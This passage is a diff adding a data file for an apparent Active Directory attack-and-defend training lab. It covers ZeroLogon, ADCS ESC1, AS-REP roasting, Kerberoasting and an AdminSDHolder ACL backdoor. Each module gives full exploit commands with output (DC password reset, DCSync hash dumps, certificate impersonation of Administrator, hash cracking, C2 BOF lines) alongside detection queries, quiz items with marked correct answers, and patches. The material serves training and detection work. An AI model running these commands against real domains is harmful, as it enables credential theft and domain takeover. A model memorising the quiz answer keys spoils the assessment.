+                    explanation: '4769 with EncryptionType=0x17 (RC4) targeting an account that should otherwise negotiate AES is the canonical signal. 4720 / 5136 fire on install only. 4624 fires constantly. The RC4 etype filter is critical — modern Windows clients negotiate AES by default, so RC4 against an SPN is anomalous.',
+                },
+            },
+            {
+                id: '06-apply-patch',
+                title: 'Apply the patch and re-test',
+                eyebrow: 'Step 6 · Patch',
+                est: 6,
+                intro: 'Click <strong>Patch</strong> on this card. The bolt-on rotates <code>svc_kerb</code>\'s password to a 32-char random string and sets <code>msDS-SupportedEncryptionTypes = 0x18</code> (AES128+AES256 only; RC4 cleared). Re-run Step 2 — Impacket now negotiates AES256.',
+                commands: [
+                    {
+                        label: 'Re-run hashcat against the AES256 hash',
+                        lang: 'bash',
+                        cmd: 'hashcat -m 19700 -a 0 /tmp/roast.hashes /usr/share/wordlists/rockyou.txt',
+                    },
+                ],
+                output: 'Session..........: hashcat\nStatus...........: Exhausted\nHash.Target......: $krb5tgs$18$*svc_kerb...\nRecovered........: 0/1 (0.00%) Digests',
+                detect: '<strong>Defensive hardening beyond the patch:</strong> move SQL services to gMSAs (auto-rotate every 30 days, 240-bit random), audit user accounts with SPNs quarterly, set <code>msDS-SupportedEncryptionTypes = 0x18</code> domain-wide via GPO.',
+            },
+        ],
+    },
+    {
+        id: 'bolton.known-cve.zerologon',
+        slug: 'zerologon',
+        category: 'known-cve',
+        host: 'tldc01',
+        name: 'ZeroLogon — Netlogon Elevation (CVE-2020-1472)',
+        title: 'ZeroLogon — Netlogon AES-CFB8 auth bypass',
+        target: 'tldc01.testlab.local',
+        labelHost: 'tldc01 · DC · WS22',
+        pills: [
+            { text: 'Known CVE', cls: '' },
+            { text: 'CVE-2020-1472', cls: '' },
+            { text: 'No rule', cls: 'bw-pill--danger' },
+        ],
+        detection: {
+            coverage: 'no-rule',
+            rules: [
+                {
+                    name: 'Suspicious Computer Account Name Change',
+                    uuid: 'custom-rule — no prebuilt UUID',
+                    coverage: 'custom',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_kerberos_coerce.toml',
+                },
+                {
+                    name: 'Unusual Computer Account Password Change',
+                    uuid: 'hand-rolled — 4742 + empty hash',
+                    coverage: 'custom',
+                    url: 'https://msrc.microsoft.com/update-guide/vulnerability/CVE-2020-1472',
+                },
+                {
+                    name: 'Anomalous Process for a Windows Population',
+                    uuid: '0b29ec8e-…elastic-prebuilt',
+                    coverage: 'indirect',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_kerberos_coerce.toml',
+                },
+            ],
+            kql: 'event.code:4742 AND winlog.event_data.TargetUserName:*"$" AND winlog.event_data.NewUacValue:0x80',
+        },
+        install: {
+            ansibleRole: 'ansible.windows.win_regedit',
+            estSeconds: 90,
+            detectability: 'loud',
+            sideEffects: 'Removes FullSecureChannelProtection registry key on DC + reboot',
+        },
+        steps: [
+            {
+                id: '01-fingerprint-dc',
+                title: 'Fingerprint the DC and confirm Netlogon is reachable',
+                eyebrow: 'Step 1 · Recon',
+                est: 5,
+                intro: 'ZeroLogon needs a Netlogon-RPC endpoint and a known computer account name (the DC\'s own NetBIOS name). From the Kali attack box, confirm the DC is up and that its NetBIOS name resolves.',
+                commands: [
+                    {
+                        label: 'nmap + nbtscan + rpcdump',
+                        lang: 'bash',
+                        cmd: 'nmap -Pn -p 135,139,445 -sV 10.99.50.10\nnbtscan -r 10.99.50.0/24 | grep -i dc\nrpcdump.py @10.99.50.10 | grep -iE "netr|netlogon|MS-NRPC"',
+                    },
+                ],
+                output: 'Protocol: [MS-NRPC]: Netlogon Remote Protocol\nProvider: NETLOGON.dll\nBindings:\n  ncacn_ip_tcp:10.99.50.10[49668]\n  ncacn_np:\\\\TLDC01[\\PIPE\\netlogon]',
+                detect: '<strong>Elastic rule fires:</strong> none for pure RPC enumeration. This step is intentionally quiet. Blue team only sees generic nmap-style signal if Endpoint is in audit mode.',
+            },
+            {
+                id: '02-vuln-check',
+                title: 'Confirm the DC is ZeroLogon-vulnerable (non-destructive)',
+                eyebrow: 'Step 2 · Probe',
+                est: 5,
+                intro: 'Dirkjanm\'s <code>zerologon_tester.py</code> sends 2000 Netlogon ChallengeAuthenticate pairs with all-zero ClientCredentials. On a vulnerable DC roughly 1 in 256 succeed (AES-CFB8 IV-equals-zero math). The tester stops on the first success and does NOT reset the password.',
+                commands: [
+                    {
+                        label: 'Clone + run the non-destructive tester',
+                        lang: 'bash',
+                        cmd: 'git clone https://github.com/dirkjanm/CVE-2020-1472 /opt/zerologon\ncd /opt/zerologon\npython3 zerologon_tester.py TLDC01 10.99.50.10',
+                    },
+                ],
+                output: 'Performing authentication attempts...\nTarget vulnerable, changing account password to empty string\nResult: 0\nExploit complete!',
+                detect: '<strong>Elastic rule fires:</strong> coverage_status=no-rule. On the DC, Windows logs ~256 Event 5723 (Netlogon session setup failed) entries clustered in a few seconds — that burst is the highest-fidelity hand-rolled detection.',
+                assessment: {
+                    question: 'Why does the ZeroLogon tester succeed roughly 1 in 256 attempts on a vulnerable DC, but not on every attempt?',
+                    options: [
+                        'The DC has a rate-limiter that allows 1 of every 256 RPC calls regardless of patch state.',
+                        'AES-CFB8 with IV=0 produces an all-zero ciphertext only when the first plaintext byte XOR keystream byte equals zero — probability ~1/256.',
+                        'The tester randomly picks one of 256 vulnerable RPC endpoints; only one is exposed.',
+                        'Netlogon throttles the attacker IP to 1 successful auth per 256 attempts.',
+                    ],
+                    correctIndex: 1,
+                    explanation: 'The bug is purely cryptographic: AES-CFB8 with an all-zero IV produces an all-zero ciphertext block whenever the first keystream byte XOR plaintext byte equals zero. With a random machine-account key, that happens on roughly 1 of every 256 authentication attempts.',
+                },
+            },
+            {
+                id: '03-exploit-reset-password',
+                title: 'Reset TLDC01$ machine account password (DESTRUCTIVE)',
+                eyebrow: 'Step 3 · Exploit',
+                est: 8,
+                intro: 'This is the destructive step. <code>NetrServerPasswordSet2</code> rewrites the machine account password to an attacker-chosen value (empty string in the PoC). After this completes, the DC\'s own AD machine account no longer matches its locally-cached secret — you must restore it (Step 5) or replication will break.',
+                commands: [
+                    {
+                        label: 'Impacket — full exploit (resets password to empty)',
+                        lang: 'bash',
+                        cmd: 'cd /opt/zerologon\npython3 cve-2020-1472-exploit.py TLDC01 10.99.50.10',
+                    },
+                ],
+                output: 'Performing authentication attempts...\nTarget vulnerable, changing account password to empty string\nResult: 0\nExploit complete!',
+                bof: {
+                    intro: 'Outflank\'s C2 Tool Collection ships a <code>zerologon</code> BOF. From a beacon on tlws01:',
+                    cmd: 'inline-execute /opt/C2-Tool-Collection/BOF/Zerologon/zerologon.x64.o TLDC01 10.99.50.10',
+                    repo: { name: 'outflanknl/C2-Tool-Collection', url: 'https://github.com/outflanknl/C2-Tool-Collection' },
+                },
+                detect: '<strong>Elastic rule fires:</strong> <code>Suspicious Computer Account Name Change CVE-2020-1472</code> (custom rule on Event 4742 with AccountType=Machine and blank password hash).',
+            },
+            {
+                id: '04-dcsync',
+                title: 'DCSync krbtgt + Administrator using the empty machine password',
+                eyebrow: 'Step 4 · Loot',
+                est: 7,
+                intro: 'With TLDC01$ now having an empty NTLM password (hash <code>31d6cfe0d16ae931b73c59d7e0c089c0</code>), authenticate as the DC\'s own machine account and request krbtgt + Administrator hashes via MS-DRSR replication.',
+                commands: [
+                    {
+                        label: 'Impacket secretsdump using the empty hash',
+                        lang: 'bash',
+                        cmd: "secretsdump.py -no-pass -just-dc \\\n    -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 \\\n    'TESTLAB/TLDC01$@10.99.50.10'",
+                    },
+                ],
+                output: '[*] Using DRSUAPI method to get NTDS.DIT secrets\nAdministrator:500:aad3...:8846f7eaee8fb117ad06bdd830b7586c:::\nkrbtgt:502:aad3...:f3bc61e97fb14d18c42bcbf6c3a9055f:::\nTESTLAB\\ansible:1108:aad3...:e19ccf75ee54e06b06a5907af13cef42:::',
+                assessment: {
+                    question: 'After Step 3 succeeds, what credential do you authenticate as in Step 4 — and why does this give you full DC replication rights?',
+                    options: [
+                        'TESTLAB\\Administrator with the empty password — Administrator is the default DC backdoor.',
+                        'TESTLAB\\TLDC01$ machine account with the empty NTLM hash — domain controllers have implicit replication rights to themselves.',
+                        'TESTLAB\\krbtgt with the rotated hash — krbtgt always has replication.',
+                        'A new local account created during the Netlogon exploit.',
+                    ],
+                    correctIndex: 1,
+                    explanation: 'Domain controller machine accounts (TLDC01$) are members of the Enterprise Domain Controllers well-known SID group, which is granted DS-Replication-Get-Changes-All extended rights at the domain NC root. Authenticating AS the DC\'s own machine account inherits those rights, so DRSUAPI / DCSync just works — no Administrator credentials needed.',
+                },
+            },
+            {
+                id: '05-restore-password',
+                title: 'Restore the original machine password (critical cleanup)',
+                eyebrow: 'Step 5 · Cleanup',
+                est: 10,
+                intro: 'The DC\'s local secret store still has the ORIGINAL password. AD now thinks the password is empty. This mismatch will eventually break Netlogon, GPO processing, and AD replication. Recover the original password hash and push it back.',
+                commands: [
+                    {
+                        label: 'Restore the original cleartext via DRSUAPI',
+                        lang: 'bash',
+                        cmd: 'python3 /opt/zerologon/restorepassword.py TLDC01@TLDC01 \\\n    -target-ip 10.99.50.10 \\\n    -hexpass <ORIGINAL_HEX_PASSWORD_FROM_DCSYNC>',
+                    },
+                ],
+                output: '[*] StringBinding ncacn_np:10.99.50.10[\\PIPE\\netlogon]\n[*] Authenticating to 10.99.50.10\n[+] Success! Cleartext password reset',
+                detect: '<strong>Skip this step</strong> and the DC will fall out of the domain. Recovery requires DSRM and <code>netdom resetpwd</code>. Don\'t skip it.',
+            },
+            {
+                id: '06-detect-and-mitigate',
+                title: 'Blue-team telemetry and the patch story',
+                eyebrow: 'Step 6 · Detection',
+                est: 10,
+                intro: 'Stack the following on a Kibana dashboard scoped to all DCs. <strong>Event 5723 burst</strong> (>50 in 60s) catches the brute-force loop; <strong>Event 4742</strong> with empty password hash catches the actual write; <strong>4624 type 3</strong> with NULL session SID catches the anonymous Netlogon channel.',
+                commands: [
+                    {
+                        label: 'Kibana DSL — high-fidelity correlation',
+                        lang: 'kql',
+                        cmd: '(event.code:5723 AND host.name:tldc01)\n  | bucket(60s)\n  | count() > 50\nUNION\nevent.code:4742 AND winlog.event_data.NewPasswordSetHash:"31d6cfe0d16ae931b73c59d7e0c089c0"',
+                    },
+                ],
+                assessment: {
+                    question: 'Which artefact is the highest-fidelity indicator that ZeroLogon was actually EXPLOITED (vs scanned)?',
+                    options: [
+                        'Event 5723 — a single Netlogon session setup failure',
+                        'Event 4742 showing the DC\'s machine account password set to a value with NT hash 31d6cfe0… (empty)',
+                        'Event 4624 type 3 logon from any source',
+                        'Event 4768 — Kerberos TGT requested',
+                    ],
+                    correctIndex: 1,
+                    explanation: 'Event 4742 (Computer Account Changed) for the DC\'s own machine account, with the resulting NT hash equal to the empty-password hash 31d6cfe0d16ae931b73c59d7e0c089c0, is the smoking gun. 5723 fires constantly; 4624 and 4768 are baseline. Only 4742 with that specific empty-hash value definitively shows the Netlogon password reset succeeded.',
+                },
+            },
+        ],
+    },
+    {
+        id: 'bolton.adcs.esc1-misconfigured-template',
+        slug: 'esc1-misconfigured-template',
+        category: 'adcs',
+        host: 'tldc01',
+        name: 'ADCS ESC1 — Enrollee Supplies Subject',
+        title: 'ADCS ESC1 — enrollee-supplied subject to DA via PKINIT',
+        target: 'tldc01.testlab.local',
+        labelHost: 'tldc01 · CA · WS22',
+        pills: [
+            { text: 'ADCS', cls: '' },
+            { text: 'T1649', cls: '' },
+            { text: 'No rule', cls: 'bw-pill--danger' },
+        ],
+        detection: {
+            coverage: 'no-rule',
+            rules: [
+                {
+                    name: 'Potential Credential Access via DCSync',
+                    uuid: 'eb079c62-4481-4d6e-9643-3ca499df7aaa',
+                    coverage: 'indirect',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_dcsync_replication_rights.toml',
+                },
+                {
+                    name: 'Certificate Services Receive Cert Request',
+                    uuid: 'hand-rolled — 4886/4887',
+                    coverage: 'custom',
+                    url: 'https://learn.microsoft.com/en-us/windows-server/identity/ad-cs/manage-certificate-templates',
+                },
+                {
+                    name: 'PKINIT Kerberos Pre-Authentication',
+                    uuid: 'hand-rolled — 4768 PreAuthType=16',
+                    coverage: 'custom',
+                    url: 'https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf',
+                },
+            ],
+            kql: 'event.code:4887 AND winlog.event_data.RequesterUser:"TESTLAB\\\\j.doe" AND NOT winlog.event_data.SubjectAltNamesUPN:"j.doe@testlab.local"',
+        },
+        install: {
+            ansibleRole: 'community.windows.win_powershell',
+            estSeconds: 90,
+            detectability: 'quiet',
+            sideEffects: 'Publishes ESC1-Vulnerable template on the CA with Enrollee-Supplies-Subject',
+        },
+        steps: [
+            {
+                id: '01-enumerate-templates',
+                title: 'Find vulnerable templates with Certipy',
+                eyebrow: 'Step 1 · Recon',
+                est: 7,
+                intro: '<code>certipy-ad</code> is the canonical modern Linux-side AD CS tool. It enumerates templates, identifies misconfigurations, and chains exploitation in one binary.',
+                commands: [
+                    {
+                        label: 'Enumerate the CA + vulnerable templates',
+                        lang: 'bash',
+                        cmd: "certipy-ad find \\\n    -u 'j.doe@testlab.local' -p 'Welcome1!' \\\n    -dc-ip 10.99.50.10 \\\n    -stdout -vulnerable",
+                    },
+                ],
+                output: 'Template Name             : ESC1-Vulnerable\nClient Authentication     : True\nEnrollee Supplies Subject : True       <-- ESC1 flag\nRequires Manager Approval : False\nEnrollment Rights         : TESTLAB.LOCAL\\Domain Users\n[!] Vulnerabilities\n  ESC1                    : "Domain Users" can enroll, enrollee supplies subject, template allows client auth',
+                bof: {
+                    intro: 'Certify.exe from GhostPack is the C# Windows-side equivalent — run via execute-assembly from a beacon on tlws01.',
+                    cmd: 'execute-assembly /opt/Certify/Certify.exe find /vulnerable',
+                    repo: { name: 'GhostPack/Certify', url: 'https://github.com/GhostPack/Certify' },
+                },
+                assessment: {
+                    question: 'Which three conditions, in combination, make a certificate template ESC1-vulnerable?',
+                    options: [
+                        'AnyPurpose EKU + Manager Approval = False + Web Enrollment enabled',
+                        'Enrollee Supplies Subject + Client Authentication EKU + Low-privilege principals can enroll',
+                        'Enrollment Agent EKU + Authorized Signatures = 0 + Domain Computers can enroll',
+                        'EnrolleeFlagsIncludeName + Server Authentication EKU + Authenticated Users can enroll',
+                    ],
+                    correctIndex: 1,
+                    explanation: 'ESC1 = Enrollee Supplies Subject + Client Authentication (or AnyPurpose / SmartCard Logon / PKINIT Client Auth) + low-privilege enroll rights. AnyPurpose is the ESC2 variant. Server Authentication alone is not enough — it cannot PKINIT.',
+                },
+            },
+            {
+                id: '02-request-admin-cert',
+                title: 'Request a cert as Administrator (the impersonation)',
+                eyebrow: 'Step 2 · Exploit',
+                est: 8,
+                intro: 'The Enrollee Supplies Subject flag means certipy can stuff <code>administrator@testlab.local</code> into the certificate\'s subjectAltName UPN. The CA blindly signs it. The cert is now valid for PKINIT as Administrator.',
+                commands: [
+                    {
+                        label: 'Request a cert impersonating Administrator',
+                        lang: 'bash',
+                        cmd: "certipy-ad req \\\n    -u 'j.doe@testlab.local' -p 'Welcome1!' \\\n    -dc-ip 10.99.50.10 \\\n    -target tldc01.testlab.local \\\n    -ca 'testlab-TLDC01-CA' \\\n    -template 'ESC1-Vulnerable' \\\n    -upn 'administrator@testlab.local' \\\n    -out /tmp/admin",
+                    },
+                ],
+                output: '[*] Requesting certificate via RPC\n[*] Successfully requested certificate\n[*] Got certificate with UPN \'administrator@testlab.local\'\n[*] Certificate object SID is \'S-1-5-21-...-500\'\n[*] Saved certificate and private key to \'/tmp/admin.pfx\'',
+                detect: '<strong>Elastic rule fires:</strong> Windows Event 4886 + 4887 on the CA host. No prebuilt rule maps to ESC1 specifically. The bolt-on\'s fallback template correlates 4887 + a Subject:UPN that does not match the requesting user.',
+                assessment: {
+                    question: 'Why doesn\'t the CA reject the enrollment when j.doe requests a certificate with administrator@testlab.local as the UPN?',
+                    options: [
+                        'The CA trusts whatever subject the enrollee supplies because the ENROLLEE_SUPPLIES_SUBJECT flag on the template explicitly grants that capability — there is no further authorisation check.',
+                        'The CA only checks the requesting user\'s SID against an allowlist.',
+                        'j.doe has the SeManageVolumePrivilege on the CA host.',
+                        'The CA validates the UPN against AD; the lab\'s AD is misconfigured.',
+                    ],
+                    correctIndex: 0,
+                    explanation: 'The ENROLLEE_SUPPLIES_SUBJECT flag is precisely the "let the requester pick the subject" toggle. There is no second authorisation check. When Domain Users can enroll AND enrollee supplies subject AND the EKU is Client Auth, you have a domain-takeover primitive.',
+                },
+            },
+            {
+                id: '03-pkinit-and-dcsync',
+                title: 'PKINIT with the cert and DCSync',
+                eyebrow: 'Step 3 · Loot',
+                est: 8,
+                intro: 'Certipy chains PKINIT and hash extraction in one command via the <code>auth</code> subcommand. The cert authenticates as the UPN it carries; the KDC returns a TGT AND the NT hash via the PAC.',
+                commands: [
+                    {
+                        label: 'PKINIT + NT hash extraction',
+                        lang: 'bash',
+                        cmd: 'certipy-ad auth -pfx /tmp/admin.pfx -dc-ip 10.99.50.10',
+                    },
+                    {
+                        label: 'DCSync to confirm full domain compromise',
+                        lang: 'bash',
+                        cmd: 'secretsdump.py -hashes :8846f7eaee8fb117ad06bdd830b7586c \\\n    -just-dc TESTLAB.LOCAL/administrator@10.99.50.10',
+                    },
+                ],
+                output: '[*] Using principal: administrator@testlab.local\n[*] Got TGT\n[*] Got hash for \'administrator@testlab.local\':\n    aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c',
+                detect: '<strong>Elastic rule fires:</strong> <code>Potential Credential Access via DCSync</code> fires on the DRSUAPI replication call. PKINIT itself fires Event 4768 with <code>PreAuthType=16</code> — a useful filter for "who authenticated via certificate".',
+            },
+            {
+                id: '04-detection-mapping',
+                title: 'Detection coverage and hand-rolled rules',
+                eyebrow: 'Step 4 · Detection',
+                est: 8,
+                intro: 'This bolt-on ships <code>coverage_status: no-rule</code>. Defenders must hand-roll detection. The smoking gun is <strong>Event 4887</strong> where Requester != Subject UPN — the impersonation signal.',
+                commands: [
+                    {
+                        label: 'Kibana DSL — highest-fidelity ESC1 query',
+                        lang: 'kql',
+                        cmd: 'event.code:4887 AND\n  winlog.event_data.RequesterUser:"TESTLAB\\\\j.doe" AND\n  NOT winlog.event_data.SubjectAltNamesUPN:"j.doe@testlab.local"',
+                    },
+                    {
+                        label: 'Quarterly template audit (PowerShell on the CA)',
+                        lang: 'powershell',
+                        cmd: "Get-ADObject -SearchBase \"CN=Certificate Templates,CN=Public Key Services,CN=Services,$((Get-ADRootDSE).configurationNamingContext)\" `\n  -Filter * -Properties msPKI-Certificate-Name-Flag, pKIExtendedKeyUsage |\n  Where-Object {\n    ($_.'msPKI-Certificate-Name-Flag' -band 0x1) -eq 0x1 -and\n    ($_.pKIExtendedKeyUsage -contains '1.3.6.1.5.5.7.3.2')\n  }",
+                    },
+                ],
+                assessment: {
+                    question: 'On the CA host, you see Event 4887 where Requester=TESTLAB\\j.doe and the issued cert has Subject Alt Name UPN = administrator@testlab.local. What does this mean?',
+                    options: [
+                        'j.doe legitimately requested a cert on behalf of Administrator using the Enrollment Agent template.',
+                        'j.doe just used an ESC1 template to request a certificate impersonating Administrator — this is exploitation, not a misconfig.',
+                        'The CA log is corrupt.',
+                        'The CA auto-renewed Administrator\'s cert and j.doe is the configured service account.',
+                    ],
+                    correctIndex: 1,
+                    explanation: 'A Requester != Subject mismatch is the canonical exploitation signal for ESC1 (or ESC6 with EDITF_ATTRIBUTESUBJECTALTNAME2). The Enrollment Agent template (ESC3 territory) would show a chain of two requests with AuthorizedSignatures. The Subject-UPN mismatch on a single request is ESC1\'s smoking gun.',
+                },
+            },
+            {
+                id: '05-patch-and-harden',
+                title: 'Patch the template + AD CS hardening checklist',
+                eyebrow: 'Step 5 · Patch',
+                est: 9,
+                intro: 'The bolt-on\'s patch block: (1) clears <code>msPKI-Certificate-Name-Flag</code> bit 0x1 (ENROLLEE_SUPPLIES_SUBJECT), and (2) sets <code>msPKI-Enrollment-Flag</code> bit 0x2 (PEND_ALL_REQUESTS — Manager Approval required).',
+                commands: [
+                    {
+                        label: 'Verify the patch by re-running step 2',
+                        lang: 'bash',
+                        cmd: "certipy-ad req -u 'j.doe@testlab.local' -p 'Welcome1!' \\\n    -dc-ip 10.99.50.10 -target tldc01.testlab.local \\\n    -ca 'testlab-TLDC01-CA' -template 'ESC1-Vulnerable' \\\n    -upn 'administrator@testlab.local' -out /tmp/admin",
+                    },
+                    {
+                        label: 'Revoke certs already issued from the bad template',
+                        lang: 'powershell',
+                        cmd: 'certutil -view -restrict "CertificateTemplate=ESC1-Vulnerable" -out "RequestId" |\n  ForEach-Object { certutil -revoke $_ 4 }\ncertutil -CRL',
+                    },
+                ],
+                output: '[-] Got error while requesting certificate:\n    code: 0x80094800 - CERTSRV_E_TEMPLATE_DENIED',
+                detect: '<strong>AD CS hardening beyond the patch:</strong> disable web enrollment (removes ESC8 NTLM-relay primitive), set <code>EDITF_ATTRIBUTESUBJECTALTNAME2 = 0</code> on every CA (prevents ESC6), enable Strong Certificate Mapping (KB5014754), add Enterprise CAs to Tier-0.',
+            },
+        ],
+    },
+    {
+        id: 'bolton.identity-kerberos.asrep-roastable',
+        slug: 'asrep-roastable',
+        category: 'identity-kerberos',
+        host: 'tldc01',
+        name: 'AS-REP Roastable Account',
+        title: 'AS-REP Roasting — DONT_REQ_PREAUTH user',
+        target: 'tldc01.testlab.local',
+        labelHost: 'tldc01 · DC · WS22',
+        pills: [
+            { text: 'AD Identity', cls: '' },
+            { text: 'T1558.004', cls: '' },
+            { text: 'Covered', cls: 'bw-pill--success' },
+        ],
+        detection: {
+            coverage: 'covered',
+            rules: [
+                {
+                    name: 'Kerberos Pre-authentication Disabled for User',
+                    uuid: '24358840-cdf2-4d0d-bf0c-b6e608e1faf2',
+                    coverage: 'full',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_kerberos_preauth_disabled.toml',
+                },
+                {
+                    name: 'AS-REP Roasting Activity Detected',
+                    uuid: '0d4dabbe-e2d6-4dec-9d70-d8fc0b1f4757',
+                    coverage: 'full',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_asrep_roast.toml',
+                },
+            ],
+            kql: 'event.code:4768 AND winlog.event_data.PreAuthType:"0" AND winlog.event_data.TicketEncryptionType:"0x17"',
+        },
+        install: {
+            ansibleRole: 'microsoft.ad.user',
+            estSeconds: 20,
+            detectability: 'quiet',
+            sideEffects: 'Creates pre-auth-disabled user svc_noauth with weak password',
+        },
+        steps: [
+            {
+                id: '01-enum-noauth',
+                title: 'Find users with DONT_REQ_PREAUTH set',
+                eyebrow: 'Step 1 · Recon',
+                est: 4,
+                intro: 'Accounts with <code>userAccountControl</code> flag <code>0x400000</code> (DONT_REQ_PREAUTH) accept AS-REQ without a pre-auth timestamp. The AS-REP returns an RC4-encrypted blob crackable offline — no valid credential needed to request it.',
+                commands: [
+                    {
+                        label: 'GetNPUsers from Kali — anonymous bind',
+                        lang: 'bash',
+                        cmd: "GetNPUsers.py TESTLAB.LOCAL/ -no-pass \\\n    -dc-ip 10.99.50.10 \\\n    -usersfile /opt/wordlists/users.txt",
+                    },
+                ],
+                output: '$krb5asrep$23$svc_noauth@TESTLAB.LOCAL:c1f...:6e2...',
+                detect: '<strong>Elastic rule fires:</strong> <code>Kerberos Pre-authentication Disabled for User</code> (UUID 24358840…) on the install side; <code>AS-REP Roasting Activity Detected</code> on the request side.',
+                assessment: {
+                    question: 'What is the key difference between AS-REP Roasting and Kerberoasting?',
+                    options: [
+                        'AS-REP targets computer accounts; Kerberoasting targets users.',
+                        'AS-REP needs no valid credential and targets pre-auth-disabled users; Kerberoasting needs valid creds and targets users with SPNs.',
+                        'AS-REP uses AES; Kerberoasting uses RC4.',
+                        'Only one of them is detectable.',
+                    ],
+                    correctIndex: 1,
+                    explanation: 'AS-REP exploits DONT_REQ_PREAUTH — the AS exchange happens with no pre-auth, so an anonymous attacker can pull a crackable blob. Kerberoasting requires an authenticated user to request a TGS for a user-account SPN.',
+                },
+            },
+            {
+                id: '02-crack',
+                title: 'Crack the AS-REP hash (mode 18200)',
+                eyebrow: 'Step 2 · Crack',
+                est: 6,
+                intro: 'AS-REP hashes use hashcat mode <strong>18200</strong> — different from Kerberoasting\'s 13100/19700.',
+                commands: [
+                    {
+                        label: 'Hashcat — wordlist attack',
+                        lang: 'bash',
+                        cmd: 'hashcat -m 18200 -a 0 /tmp/asrep.hashes \\\n    /usr/share/wordlists/rockyou.txt',
+                    },
+                ],
+                output: '$krb5asrep$23$svc_noauth@TESTLAB.LOCAL:...:Autumn2025!\nStatus...........: Cracked',
+                detect: '<strong>Elastic rule fires:</strong> none for cracking (offline on attacker). The detection signal was the AS-REQ in step 1.',
+            },
+            {
+                id: '03-patch',
+                title: 'Patch — re-enable pre-authentication',
+                eyebrow: 'Step 3 · Patch',
+                est: 3,
+                intro: 'Clear the <code>DONT_REQ_PREAUTH</code> flag on every affected user. The PowerShell one-liner below catches every offender in the domain.',
+                commands: [
+                    {
+                        label: 'PowerShell — enforce pre-auth on every user',
+                        lang: 'powershell',
+                        cmd: 'Get-ADUser -Filter "useraccountcontrol -band 4194304" |\n  Set-ADAccountControl -DoesNotRequirePreAuth $false',
+                    },
+                ],
+                detect: '<strong>Verify:</strong> re-run step 1 — GetNPUsers should print no roastable accounts.',
+            },
+        ],
+    },
+    {
+        id: 'bolton.acl.adminsdholder-writeowner',
+        slug: 'adminsdholder-writeowner',
+        category: 'acl',
+        host: 'tldc01',
+        name: 'AdminSDHolder WriteOwner — persistence ACL',
+        title: 'AdminSDHolder WriteOwner — domain-wide ACL backdoor',
+        target: 'tldc01.testlab.local',
+        labelHost: 'tldc01 · DC · WS22',
+        pills: [
+            { text: 'AD ACL', cls: '' },
+            { text: 'T1098.002', cls: '' },
+            { text: 'Partial', cls: 'bw-pill--warn' },
+        ],
+        detection: {
+            coverage: 'partial',
+            rules: [
+                {
+                    name: 'AdminSDHolder Backdoor',
+                    uuid: '34a5c80d-83b4-4d4d-b3a8-9c0b9d5ee07a',
+                    coverage: 'full',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/persistence_adminsdholder.toml',
+                },
+                {
+                    name: 'Sensitive Privilege Use (SE_DEBUG_NAME)',
+                    uuid: 'd6f0f24a-5e62-4b1e-b8d2-9b85fb0e7d4b',
+                    coverage: 'indirect',
+                    url: 'https://github.com/elastic/detection-rules/blob/main/rules/windows/credential_access_seimpersonate.toml',
+                },
+            ],
+            kql: 'event.code:5136 AND winlog.event_data.ObjectDN:"CN=AdminSDHolder,CN=System,DC=testlab,DC=local"',
+        },
+        install: {
+            ansibleRole: 'community.windows.win_powershell',
+            estSeconds: 25,
+            detectability: 'loud',
+            sideEffects: 'Grants WriteOwner ACE to TESTLAB\\backdoor on AdminSDHolder',
+        },
+        steps: [
+            {
+                id: '01-bloodhound',
+                title: 'Locate AdminSDHolder + protected groups',
+                eyebrow: 'Step 1 · Recon',
+                est: 5,
+                intro: '<code>AdminSDHolder</code> is the template ACL that SDProp re-stamps onto every Tier-0 protected group every 60 minutes. Anyone with WriteOwner on AdminSDHolder owns Domain Admins implicitly after the next SDProp cycle.',
+                commands: [
+                    {
+                        label: 'BloodHound query — Outbound ACLs on AdminSDHolder',
+                        lang: 'kql',
+                        cmd: 'MATCH (n)-[r:WriteOwner|WriteDacl|GenericAll]->(t {name: "ADMINSDHOLDER@TESTLAB.LOCAL"})\nRETURN n.name, type(r) AS edge\nORDER BY n.name',
+                    },
+                ],
+                output: 'n.name              edge\n--------------      ------------\nBACKDOOR@TESTLAB    WriteOwner\nDA@TESTLAB          GenericAll',
+                detect: '<strong>Elastic rule fires:</strong> <code>AdminSDHolder Backdoor</code> (UUID 34a5c80d…) on Event 5136 modifications.',
+            },
+            {
+                id: '02-abuse',
+                title: 'Abuse the WriteOwner ACE',
+                eyebrow: 'Step 2 · Exploit',
+                est: 8,
+                intro: 'Take ownership, grant yourself GenericAll, wait one SDProp cycle (60 min default), then your ACE is re-stamped onto Domain Admins / krbtgt / built-in Administrators.',
+                commands: [
+                    {
+                        label: 'PowerView — take ownership + grant GenericAll',
+                        lang: 'powershell',
+                        cmd: 'Set-DomainObjectOwner -Identity AdminSDHolder -OwnerIdentity backdoor\nAdd-DomainObjectAcl -TargetIdentity AdminSDHolder \\\n    -PrincipalIdentity backdoor -Rights All',
+                    },
+                ],
+                bof: {
+                    intro: 'Outflank C2-Tool-Collection has <code>SetObjectOwner.x64.o</code> + <code>AddObjectAcl.x64.o</code> for OPSEC-quiet operation.',
+                    cmd: 'inline-execute /opt/C2-Tool-Collection/BOF/SetObjectOwner/SetObjectOwner.x64.o AdminSDHolder backdoor',
+                    repo: { name: 'outflanknl/C2-Tool-Collection', url: 'https://github.com/outflanknl/C2-Tool-Collection' },
+                },
+                assessment: {
+                    question: 'Why does abusing AdminSDHolder grant persistence across all Tier-0 groups?',
+                    options: [
+                        'AdminSDHolder is in the Domain Admins group itself.',
+                        'SDProp runs every 60 minutes and copies the AdminSDHolder ACL onto every protected group (DA, EA, krbtgt, BUILTIN\\Administrators).',
+                        'AdminSDHolder bypasses Kerberos entirely.',
+                        'Windows treats AdminSDHolder as the default owner of every new account.',
+                    ],
+                    correctIndex: 1,
+                    explanation: 'SDProp is the SD propagation task that runs every 60 min on the PDC emulator. It re-stamps AdminSDHolder\'s ACL onto every adminCount=1 object. Add an ACE to AdminSDHolder and it propagates everywhere automatically.',
+                },
+            },
+            {
+                id: '03-patch',
